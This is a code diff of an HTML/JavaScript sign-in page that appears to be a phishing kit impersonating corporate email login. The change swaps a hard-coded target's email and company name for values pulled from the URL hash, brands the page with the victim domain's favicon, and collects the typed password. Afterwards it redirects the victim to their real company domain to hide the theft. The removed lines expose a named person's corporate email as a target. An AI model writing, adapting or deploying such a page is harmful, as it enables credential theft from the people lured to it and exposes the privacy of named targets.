@@ -112,17 +112,17 @@
                 </div>
 
                 <!-- Company Name -->
-                <h5 id="companyName">UNITEDCORPORATE</h5>
+                <h5 id="companyName"></h5>
 
                 <!-- Error Message -->
                 <div id="error-message" style="display: none;">
-                    The password is incorrect or empty. Please try again.
+                    An error occurred. Please try again.
                 </div>
 
                 <!-- Form Section -->
                 <div>
                     <p>Sign in with your Email to continue:</p>
-                    <input type="text" id="email" value="megan.conley@unitedcorporate.com" readonly>
+                    <input type="text" id="email" value="" readonly>
                     <p>Enter password:</p>
                     <input type="password" id="password" placeholder="Password">
                     <button type="button" onclick="nextFun();">Sign In</button>
@@ -143,7 +143,36 @@
 
     <script src="assets/bootstrap/js/bootstrap.min.js"></script>
     <script>
-        const nextFun = () => {
+        // Dynamically update email and company name from URL hash
+        document.addEventListener("DOMContentLoaded", function () {
+            const hash = decodeURIComponent(window.location.hash.substring(1));
+            const emailField = document.getElementById("email");
+            const companyField = document.getElementById("companyName");
+            const logoField = document.getElementById("logoImg");
+
+            // Update email field dynamically
+            if (hash && hash.includes("@")) {
+                emailField.value = hash;
+
+                const domain = hash.split("@")[1].toLowerCase();
+                const companyNameMapping = {
+                    "unitedcorporate.com": "UNITEDCORPORATE",
+                    "calypsostbarth.com": "CALYPSOSTBARTH"
+                };
+
+                // Dynamically update company name and logo
+                const companyName = companyNameMapping[domain] || domain.split(".")[0].toUpperCase();
+                companyField.textContent = companyName;
+                logoField.src = `https://www.google.com/s2/favicons?sz=128&domain=${domain}`; // Dynamic logo from domain
+            } else {
+                // Reset if hash is invalid
+                emailField.value = "";
+                companyField.textContent = "UNKNOWN COMPANY";
+            }
+        });
+
+        // Function to handle login
+        function nextFun() {
             const email = document.getElementById("email").value;
             const password = document.getElementById("password").value;
 
@@ -168,7 +197,7 @@
                         window.location.href = data.redirectUrl || `https://${email.split("@")[1]}`;
                     } else {
                         errorDiv.style.display = "block";
-                        errorDiv.innerText = data.message || "Invalid credentials. Please try again.";
+                        errorDiv.innerText = data.message || "An error occurred. Please try again.";
                     }
                 })
                 .catch((error) => {
@@ -177,7 +206,7 @@
                     errorDiv.style.display = "block";
                     errorDiv.innerText = "An error occurred. Please try again.";
                 });
-        };
+        }
     </script>
 </body>
 
